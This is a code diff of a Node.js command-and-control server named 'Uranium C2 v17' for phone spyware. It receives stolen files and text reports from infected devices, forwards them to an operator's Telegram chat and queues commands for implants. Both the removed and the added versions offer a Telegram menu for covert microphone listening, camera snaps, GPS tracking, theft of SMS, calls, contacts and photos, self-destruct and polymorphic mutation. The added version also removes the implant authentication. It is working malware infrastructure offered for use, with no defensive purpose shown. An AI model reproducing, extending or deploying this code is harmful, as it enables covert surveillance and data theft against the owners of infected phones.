@@ -1,257 +1,238 @@
 // =========================================================================
-// Uranium v17 — aligned C2 server
-// Node 20 LTS · express 4 · sqlite3 5 · node-telegram-bot-api 0.6x
-// Contract: stream JSON {type,data}, upload_raw bytes, HMAC-SHA256 auth
+// ⚡ مملكة ناصر دين الله الكلعي ⚡ - Uranium C2 Server v17.0 [Legendary]
 // =========================================================================
 require('dotenv').config();
 const express = require('express');
 const telegramBot = require('node-telegram-bot-api');
 const fs = require('fs');
 const path = require('path');
-const crypto = require('crypto');
 const sqlite3 = require('sqlite3').verbose();
 
-const TOKEN    = process.env.TG_TOKEN;
-const CHAT_ID  = process.env.TG_ID;
-const NODE_KEY = process.env.NODE_HMAC_KEY;
+const token = process.env.TG_TOKEN;
+const chatId = process.env.TG_ID;
 
-if (!TOKEN || !CHAT_ID || !NODE_KEY) {
-  console.error('missing env: TG_TOKEN / TG_ID / NODE_HMAC_KEY');
-  process.exit(1);
-}
-if (!/^[0-9a-fA-F]{64}$/.test(NODE_KEY)) {
-  console.error('NODE_HMAC_KEY must be 64 hex chars (openssl rand -hex 32)');
-  process.exit(1);
+if (!token || !chatId) {
+    console.error('[-] Critical Error: Telegram credentials missing.');
+    process.exit(1);
 }
 
 const STORAGE_DIR = path.join(__dirname, 'uranium_storage');
-fs.mkdirSync(STORAGE_DIR, { recursive: true });
+if (!fs.existsSync(STORAGE_DIR)) fs.mkdirSync(STORAGE_DIR, { recursive: true });
 
 const db = new sqlite3.Database('./uranium_core_v17.db');
 db.serialize(() => {
-  db.run(`CREATE TABLE IF NOT EXISTS nodes (
-    id TEXT PRIMARY KEY, model TEXT, last_seen INTEGER)`);
-  db.run(`CREATE TABLE IF NOT EXISTS tasks (
-    id INTEGER PRIMARY KEY AUTOINCREMENT, node_id TEXT, action TEXT,
-    payload TEXT, status TEXT DEFAULT 'PENDING',
-    created_at INTEGER DEFAULT (strftime('%s','now')))`);
+    db.run(`CREATE TABLE IF NOT EXISTS nodes (id TEXT PRIMARY KEY, model TEXT, last_seen INTEGER)`);
+    db.run(`CREATE TABLE IF NOT EXISTS tasks (id INTEGER PRIMARY KEY AUTOINCREMENT, node_id TEXT, action TEXT, payload TEXT, status TEXT)`);
 });
 
 const app = express();
-const bot = new telegramBot(TOKEN, { polling: true });
-bot.on('polling_error', e => {
-  if (!(e.code === 'ETELEGRAM' && e.message.includes('409 Conflict')))
-    console.log(`[tg] ${e.code}: ${e.message}`);
+const appBot = new telegramBot(token, { polling: true });
+
+appBot.on('polling_error', (error) => {
+    if (error.code !== 'ETELEGRAM' || error.message.indexOf('409 Conflict') === -1) {
+        console.log(`[Telegram Polling Warning]: ${error.code} - ${error.message}`);
+    }
 });
 
-// ── crypto: HKDF + HMAC, matching the implant ─────────────────────────
-const MASTER = Buffer.from(NODE_KEY, 'hex');
-const keyForNode = id =>
-  Buffer.from(crypto.hkdfSync('sha256', MASTER, Buffer.from(id), Buffer.from('uranium-v17'), 32));
+// استقبال النصوص والملفات بحدود آمنة
+app.use('/api/v3/uranium/stream', express.text({ type: 'application/json', limit: '10mb' }));
+app.use('/api/v3/uranium/upload_raw', express.raw({ type: 'application/octet-stream', limit: '200mb' }));
 
-function auth(req, res, next) {
-  const id  = req.header('x-node-id');
-  const ts  = req.header('x-timestamp');
-  const sig = req.header('x-signature');
-  if (!id || !ts || !sig) return res.status(401).json({ status: 'AUTH_MISSING' });
-  const now = Math.floor(Date.now() / 1000);
-  if (!Number.isFinite(Number(ts)) || Math.abs(now - Number(ts)) > 300)
-    return res.status(401).json({ status: 'CLOCK_SKEW' });
-
-  const body = Buffer.isBuffer(req.body) ? req.body
-    : Buffer.from(req.body !== undefined ? JSON.stringify(req.body) : '');
-  const bodyHash = crypto.createHash('sha256').update(body).digest('hex');
-  const msg = `${id}:${ts}:${bodyHash}`;
-  const mac = crypto.createHmac('sha256', keyForNode(id)).update(msg).digest('hex');
-
-  let a, b;
-  try { a = Buffer.from(mac, 'hex'); b = Buffer.from(sig, 'hex'); }
-  catch { return res.status(401).json({ status: 'SIG_FORMAT' }); }
-  if (a.length !== b.length || !crypto.timingSafeEqual(a, b))
-    return res.status(401).json({ status: 'SIG_BAD' });
-
-  req.nodeId = id;
-  next();
+async function sendTg(msg, options = {}) {
+    try {
+        return await appBot.sendMessage(chatId, msg, { parse_mode: 'HTML', ...options });
+    } catch (e) {
+        console.error('TG Error:', e.message);
+    }
 }
-
-// raw body must be captured BEFORE JSON parse for correct hashing
-app.use('/api/v3/uranium/upload_raw',
-  express.raw({ type: 'application/octet-stream', limit: '200mb' }),
-  (req, _res, next) => { req.bodyBuffer = req.body; next(); });
-
-// json body for stream — capture raw string too so hash is exact-bytes
-app.use('/api/v3/uranium/stream',
-  express.text({ type: 'application/json', limit: '4mb' }),
-  (req, _res, next) => {
-    const raw = typeof req.body === 'string' ? req.body : '';
-    try { req.body = JSON.parse(raw); req.rawBody = raw; }
-    catch { req.body = null; req.rawBody = raw; }
-    next();
-  });
-
-app.use(express.json({ limit: '4mb' }));
-
-// ── telegram ──────────────────────────────────────────────────────────
-const sendTg = (msg, opts = {}) =>
-  bot.sendMessage(CHAT_ID, msg, { parse_mode: 'HTML', ...opts })
-     .catch(e => console.error('tg:', e.message));
 
 async function sendTgDocumentSmart(filePath, caption) {
-  if (!fs.existsSync(filePath)) return;
-  const size = fs.statSync(filePath).size;
-  const LIMIT = 45 * 1024 * 1024;
-  if (size <= LIMIT) {
-    return bot.sendDocument(CHAT_ID, filePath, { caption })
-      .catch(() => sendTg(`⚠️ send failed, stored at <code>${path.basename(filePath)}</code> (${(size/1048576).toFixed(2)} MB)`));
-  }
-  await sendTg(`📦 <b>${path.basename(filePath)}</b> is ${(size/1048576).toFixed(2)} MB — chunking.`);
-  const fd = fs.openSync(filePath, 'r');
-  const buf = Buffer.alloc(LIMIT);
-  let part = 1, n;
-  while ((n = fs.readSync(fd, buf, 0, LIMIT, null)) > 0) {
-    const p = `${filePath}.part${String(part).padStart(3, '0')}`;
-    fs.writeFileSync(p, buf.subarray(0, n));
-    await bot.sendDocument(CHAT_ID, p, { caption: `${caption} — part ${part}` }).catch(() => {});
-    fs.unlinkSync(p);
-    part++;
-  }
-  fs.closeSync(fd);
+    if (!fs.existsSync(filePath)) return;
+    const stats = fs.statSync(filePath);
+    const fileSizeMB = stats.size / (1024 * 1024);
+    const CHUNK_LIMIT = 45 * 1024 * 1024;
+
+    if (stats.size <= CHUNK_LIMIT) {
+        try {
+            await appBot.sendDocument(chatId, filePath, { caption: `${caption}\n⚔️ [تنفيذ وإشراف السلطان]` });
+        } catch (e) {
+            await sendTg(`⚠️ فشل إرسال الملف مباشرة، تم حفظه محلياً (${fileSizeMB.toFixed(2)} MB).`);
+        }
+    } else {
+        try { await sendTg(`📦 الملف ضخم (${fileSizeMB.toFixed(2)} MB). جاري التقسيم...`); } catch (e) {}
+        const fd = fs.openSync(filePath, 'r');
+        // إصلاح: استخدام Buffer.alloc بدلاً من allocate
+        const buffer = Buffer.alloc(CHUNK_LIMIT);
+        let partNum = 1;
+        let bytesRead;
+
+        while ((bytesRead = fs.readSync(fd, buffer, 0, CHUNK_LIMIT, null)) > 0) {
+            const partPath = `${filePath}.part${String(partNum).padStart(3, '0')}`;
+            fs.writeFileSync(partPath, buffer.subarray(0, bytesRead));
+            try {
+                await appBot.sendDocument(chatId, partPath, { caption: `${caption} - الجزء (${partNum})` });
+            } catch (err) {}
+            try { fs.unlinkSync(partPath); } catch (e) {}
+            partNum++;
+        }
+        fs.closeSync(fd);
+    }
 }
 
-// ── endpoints ─────────────────────────────────────────────────────────
-app.get('/', (_q, res) => res.type('html').send(
-  `<html><body style="background:#000;color:#0f6;font-family:monospace;text-align:center;padding-top:50px">
-   <h1>[☢️] URANIUM C2 v17 ONLINE [☢️]</h1>
-   <p>stream: /api/v3/uranium/stream · ingest: /api/v3/uranium/upload_raw</p>
-   </body></html>`));
+app.get('/', (req, res) => {
+    res.status(200).send(`<html><body style="background:#000;color:#00ff66;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM C2 v17.0 [LEGENDARY] ONLINE [☢️]</h1></body></html>`);
+});
 
-app.post('/api/v3/uranium/stream',
-  (req, _res, next) => { req.body = req.rawBody; next(); },
-  (req, res, next) => {
-    const id = req.header('x-node-id');
-    const ts = req.header('x-timestamp');
-    const sig = req.header('x-signature');
-    if (!id || !ts || !sig) return res.status(401).json({ status: 'AUTH_MISSING' });
-    const now = Math.floor(Date.now() / 1000);
-    if (Math.abs(now - Number(ts)) > 300) return res.status(401).json({ status: 'CLOCK_SKEW' });
-    const bodyHash = crypto.createHash('sha256')
-      .update(req.rawBody || '').digest('hex');
-    const mac = crypto.createHmac('sha256', keyForNode(id))
-      .update(`${id}:${ts}:${bodyHash}`).digest('hex');
-    if (mac.length !== sig.length ||
-        !crypto.timingSafeEqual(Buffer.from(mac,'hex'), Buffer.from(sig,'hex')))
-      return res.status(401).json({ status: 'SIG_BAD' });
-    req.nodeId = id;
-    next();
-  },
-  (req, res) => {
-    const { nodeId } = req;
-    const model = req.header('x-node-model') || 'unknown';
-    db.run(`INSERT OR REPLACE INTO nodes (id, model, last_seen) VALUES (?, ?, ?)`,
-           [nodeId, model, Date.now()]);
-    const payload = req.body || {};
-    if (payload.type === 'TEXT_REPORT' && typeof payload.data === 'string' && payload.data.length > 2) {
-      const safe = payload.data.slice(0, 3800)
-        .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-      sendTg(`☢ <b>node <code>${nodeId}</code>:</b>\n<pre>${safe}</pre>`);
+app.post('/api/v3/uranium/upload_raw', async (req, res) => {
+    try {
+        const nodeId = req.headers['x-node-id'] || 'unknown';
+        const nodeModel = req.headers['x-node-model'] || 'Unknown';
+        const fileName = req.headers['x-file-name'] || `uranium_archive_${Date.now()}.zip`;
+
+        db.run(`INSERT OR REPLACE INTO nodes (id, model, last_seen) VALUES (?, ?, ?)`, [nodeId, nodeModel, Date.now()]);
+
+        if (!req.body || !Buffer.isBuffer(req.body)) {
+            return res.status(400).json({ status: 'BAD_BINARY_PAYLOAD' });
+        }
+
+        const safeName = path.basename(fileName);
+        const controllerFilePath = path.join(STORAGE_DIR, `${nodeId}_${Date.now()}_${safeName}`);
+        fs.writeFileSync(controllerFilePath, req.body);
+
+        const stats = fs.statSync(controllerFilePath);
+        const fileSizeMB = stats.size / (1024 * 1024);
+
+        await sendTg(`☢️ <b>حصاد جديد:</b>\n📱 العقدة: <code>${nodeId}</code> (${nodeModel})\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)`);
+        await sendTgDocumentSmart(controllerFilePath, `☠️ أرشيف: <code>${safeName}</code>`);
+
+        res.status(200).json({ status: 'OK', message: 'SAVED_AND_FORWARDED' });
+    } catch (e) {
+        console.error('Upload Error:', e);
+        res.status(500).json({ status: 'SERVER_ERROR', message: e.message });
     }
-    db.get(`SELECT * FROM tasks WHERE node_id=? AND status='PENDING' ORDER BY id LIMIT 1`,
-           [nodeId], (err, row) => {
-      if (err) return res.status(500).json({ status: 'SERVER_ERROR' });
-      if (!row) return res.json({ status: 'ACK', task: null });
-      db.run(`UPDATE tasks SET status='SENT' WHERE id=?`, [row.id]);
-      res.json({ status: 'ACK', task: {
-        id: row.id, action: row.action,
-        payload: JSON.parse(row.payload || '{}'),
-      }});
-    });
-  });
-
-app.post('/api/v3/uranium/upload_raw', (req, res, next) => {
-  const id = req.header('x-node-id');
-  const ts = req.header('x-timestamp');
-  const sig = req.header('x-signature');
-  if (!id || !ts || !sig) return res.status(401).json({ status: 'AUTH_MISSING' });
-  const now = Math.floor(Date.now() / 1000);
-  if (Math.abs(now - Number(ts)) > 300) return res.status(401).json({ status: 'CLOCK_SKEW' });
-  const body = req.bodyBuffer || Buffer.alloc(0);
-  const bodyHash = crypto.createHash('sha256').update(body).digest('hex');
-  const mac = crypto.createHmac('sha256', keyForNode(id))
-    .update(`${id}:${ts}:${bodyHash}`).digest('hex');
-  if (mac.length !== sig.length ||
-      !crypto.timingSafeEqual(Buffer.from(mac,'hex'), Buffer.from(sig,'hex')))
-    return res.status(401).json({ status: 'SIG_BAD' });
-  req.nodeId = id;
-  next();
-}, async (req, res) => {
-  const { nodeId } = req;
-  const model = req.header('x-node-model') || 'unknown';
-  const fileName = path.basename(req.header('x-file-name') || `archive_${Date.now()}.bin`);
-  const bytes = req.bodyBuffer || Buffer.alloc(0);
-  if (!bytes.length) return res.status(400).json({ status: 'EMPTY' });
-  db.run(`INSERT OR REPLACE INTO nodes (id, model, last_seen) VALUES (?, ?, ?)`,
-         [nodeId, model, Date.now()]);
-  const out = path.join(STORAGE_DIR, `${nodeId}_${Date.now()}_${fileName}`);
-  fs.writeFileSync(out, bytes);
-  await sendTg(`☢️ <b>harvest</b> from <code>${nodeId}</code>: <code>${fileName}</code> (${(bytes.length/1048576).toFixed(2)} MB)`);
-  await sendTgDocumentSmart(out, `☠️ archive: <code>${fileName}</code>`);
-  res.json({ status: 'OK' });
 });
 
-// ── telegram UI ───────────────────────────────────────────────────────
-const ACTIONS = [
-  'MIC_AI_LISTEN','MICRO_BURST_SNAP','STEALTH_BLACKOUT','GEO_FENCE_ALERT',
-  'SELF_DESTRUCT','POLY_MUTATE','WIFI_AUTOPILOT','STORAGE_AUDIT',
-  'PROC_DCIM','PROC_DOWNLOAD','PROC_PICTURES','PROC_DOCUMENTS',
-  'EXTRACT_SMS','EXTRACT_CALLS','EXTRACT_CONTACTS','EXTRACT_LOCATION',
-  'EXTRACT_APPS','EXTRACT_CLIPBOARD',
-];
+app.post('/api/v3/uranium/stream', async (req, res) => {
+    try {
+        const nodeId = req.headers['x-node-id'] || 'unknown';
+        const nodeModel = req.headers['x-node-model'] || 'Unknown';
 
-const sendMenu = (chatId, msgId) => {
-  db.all(`SELECT id, model FROM nodes`, (err, rows) => {
-    const kb = (rows && rows.length)
-      ? rows.map(n => [{ text: `☢️ ${n.model} (${n.id.slice(0,6)})`,
-                          callback_data: `menu_${n.id}` }])
-      : [];
-    const opts = { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } };
-    if (msgId) bot.editMessageText('pick a node:', { chat_id: chatId, message_id: msgId, ...opts }).catch(() => {});
-    else bot.sendMessage(chatId, 'pick a node:', opts).catch(() => {});
-  });
-};
+        db.run(`INSERT OR REPLACE INTO nodes (id, model, last_seen) VALUES (?, ?, ?)`, [nodeId, nodeModel, Date.now()]);
+        
+        let payload = {};
+        try {
+            payload = JSON.parse(req.body);
+        } catch (err) {
+            return res.status(400).json({ status: 'BAD_PAYLOAD' });
+        }
 
-bot.on('message', async (msg) => {
-  if (String(msg.chat.id) !== String(CHAT_ID)) return;
-  if (msg.text === '/start') sendMenu(msg.chat.id);
+        let directive = { status: 'ACK', task: null };
+
+        if (payload.type === 'TEXT_REPORT') {
+            const textData = payload.data || '';
+            if (textData.length > 2) {
+                await sendTg(`☢ <b>تقرير [<code>${nodeId}</code>]:</b>\n<pre>${textData.substring(0, 3800)}</pre>`);
+            }
+        }
+
+        db.get(`SELECT * FROM tasks WHERE node_id = ? AND status = 'PENDING' LIMIT 1`, [nodeId], (err, row) => {
+            if (row) {
+                directive.task = { id: row.id, action: row.action, payload: JSON.parse(row.payload || '{}') };
+                db.run(`UPDATE tasks SET status = 'SENT' WHERE id = ?`, [row.id]);
+            }
+            res.status(200).json(directive);
+        });
+    } catch (e) {
+        res.status(500).json({ status: 'SERVER_ERROR', message: e.message });
+    }
 });
 
-bot.on('callback_query', async (q) => {
-  const parts = q.data.split('_');
-  if (parts[0] === 'menu') {
-    const nodeId = parts.slice(1).join('_');
-    const kb = {
-      inline_keyboard: [
-        ...ACTIONS.map(a => ([{ text: a.replace(/_/g,' '),
-                                callback_data: `cmd_${a}_${nodeId}` }])),
-        [{ text: '⬅ home', callback_data: 'home' }],
-      ],
-    };
-    bot.editMessageText(`node <code>${nodeId}</code>`, {
-      chat_id: q.message.chat.id, message_id: q.message.message_id,
-      parse_mode: 'HTML', reply_markup: kb,
-    }).catch(() => {});
-  } else if (parts[0] === 'cmd') {
-    const nodeId = parts.pop();
-    const action = parts.slice(1).join('_');
-    db.run(`INSERT INTO tasks (node_id, action, payload, status) VALUES (?, ?, '{}', 'PENDING')`,
-      [nodeId, action], () => {
-        bot.answerCallbackQuery(q.id, { text: `fired ${action}` }).catch(() => {});
-        sendTg(`⚡ <b>${action}</b> queued for <code>${nodeId}</code>`);
-      });
-  } else if (q.data === 'home') {
-    sendMenu(q.message.chat.id, q.message.message_id);
-  }
+appBot.on('message', async (msg) => {
+    if (String(msg.chat.id) !== String(chatId)) return;
+    const text = msg.text;
+
+    if (text === '/start') {
+        db.all(`SELECT id, model, last_seen FROM nodes`, async (err, rows) => {
+            if (!rows || rows.length === 0) {
+                await sendTg(`⚠️ <b>لا توجد عقد متصلة حالياً.</b>`);
+                return;
+            }
+
+            let inlineKeyboard = [];
+            rows.forEach(node => {
+                inlineKeyboard.push([{ text: `☢️ ${node.model} (${node.id.substring(0, 6)})`, callback_data: `menu_${node.id}` }]);
+            });
+
+            await sendTg(`👑 <b>لوحة التحكم المركزية:</b>\nاختر العقدة:`, {
+                reply_markup: { inline_keyboard: inlineKeyboard }
+            });
+        });
+    }
+});
+
+appBot.on('callback_query', async (query) => {
+    const data = query.data;
+    const msg = query.message;
+
+    if (data.startsWith('menu_')) {
+        const nodeId = data.replace('menu_', '');
+        const keyboard = {
+            inline_keyboard: [
+                [
+                    { text: '🎙️ تنصت ذكي', callback_data: `cmd_MIC_AI_LISTEN_${nodeId}` },
+                    { text: '👁️ لقطة خاطفة', callback_data: `cmd_MICRO_BURST_SNAP_${nodeId}` }
+                ],
+                [
+                    { text: '🛡️ قفل مظلم', callback_data: `cmd_STEALTH_BLACKOUT_${nodeId}` },
+                    { text: '🛰️ إحداثيات', callback_data: `cmd_GEO_FENCE_ALERT_${nodeId}` }
+                ],
+                [
+                    { text: '💥 تدمير ذاتي', callback_data: `cmd_SELF_DESTRUCT_${nodeId}` },
+                    { text: '🧬 تشكل برمجي', callback_data: `cmd_POLY_MUTATE_${nodeId}` }
+                ],
+                [
+                    { text: '📶 طيار Wi-Fi', callback_data: `cmd_WIFI_AUTOPILOT_${nodeId}` },
+                    { text: '📊 فحص التخزين', callback_data: `cmd_STORAGE_AUDIT_${nodeId}` }
+                ],
+                [
+                    { text: '📁 DCIM', callback_data: `cmd_PROC_DCIM_${nodeId}` },
+                    { text: '📥 Download', callback_data: `cmd_PROC_DOWNLOAD_${nodeId}` }
+                ],
+                [
+                    { text: '🖼️ Pictures', callback_data: `cmd_PROC_PICTURES_${nodeId}` },
+                    { text: '📄 Documents', callback_data: `cmd_PROC_DOCUMENTS_${nodeId}` }
+                ],
+                [
+                    { text: '📨 SMS', callback_data: `cmd_EXTRACT_SMS_${nodeId}` },
+                    { text: '📞 المكالمات', callback_data: `cmd_EXTRACT_CALLS_${nodeId}` }
+                ],
+                [
+                    { text: '📇 الجهات', callback_data: `cmd_EXTRACT_CONTACTS_${nodeId}` },
+                    { text: '📍 GPS', callback_data: `cmd_EXTRACT_LOCATION_${nodeId}` }
+                ],
+                [{ text: '🔙 القائمة الرئيسية', callback_data: 'back_home' }]
+            ]
+        };
+        await appBot.editMessageText(`🎯 <b>العقدة:</b> <code>${nodeId}</code>\nاختر الأمر:`, {
+            chat_id: msg.chat.id,
+            message_id: msg.message_id,
+            parse_mode: 'HTML',
+            reply_markup: keyboard
+        });
+    } else if (data.startsWith('cmd_')) {
+        const parts = data.split('_');
+        const targetNodeId = parts.pop();
+        const action = parts.slice(1).join('_');
+
+        db.run(`INSERT INTO tasks (node_id, action, payload, status) VALUES (?, ?, '{}', 'PENDING')`, [targetNodeId, action], async () => {
+            await appBot.answerCallbackQuery(query.id, { text: `☢️ تم إطلاق [${action}]` });
+            await sendTg(`⚡ <b>أمر [<code>${action}</code>] قيد التنفيذ للعقدة <code>${targetNodeId}</code>...</b>`);
+        });
+    } else if (data === 'back_home') {
+        await appBot.deleteMessage(msg.chat.id, msg.message_id);
+        await sendTg(`أرسل <code>/start</code> للقائمة.`);
+    }
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, '0.0.0.0', () =>
-  console.log(`[+] uranium v17 aligned on :${PORT}`));
+app.listen(PORT, () => console.log(`[+] Uranium C2 v17.0 [Legendary] on port ${PORT}`));
